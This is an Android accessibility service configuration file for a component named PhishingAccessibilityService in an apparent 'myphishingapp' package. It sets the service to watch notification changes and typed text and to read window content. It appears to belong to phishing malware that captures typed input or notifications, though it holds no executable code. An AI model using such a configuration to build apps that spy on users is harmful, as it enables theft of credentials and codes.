<?xml version="1.0" encoding="utf-8"?>
<!--
    res/xml/accessibility_service_config.xml
    Configuration for PhishingAccessibilityService.
    Tells Android which events and packages to monitor.
-->
<accessibility-service
    xmlns:android="http://schemas.android.com/apk/res/android"

    android:accessibilityEventTypes="
        typeNotificationStateChanged|
        typeViewTextChanged"

    android:accessibilityFeedbackType="feedbackGeneric"

    android:accessibilityFlags="
        flagReportViewIds|
        flagRetrieveInteractiveWindows"

    android:canRetrieveWindowContent="true"
    android:canRequestFilterKeyEvents="false"
    android:canRequestTouchExplorationMode="false"

    android:description="@string/accessibility_service_description"
    android:notificationTimeout="100"

    android:settingsActivity="com.example.myphishingapp.MainActivity"

    android:summary="@string/accessibility_service_summary"/>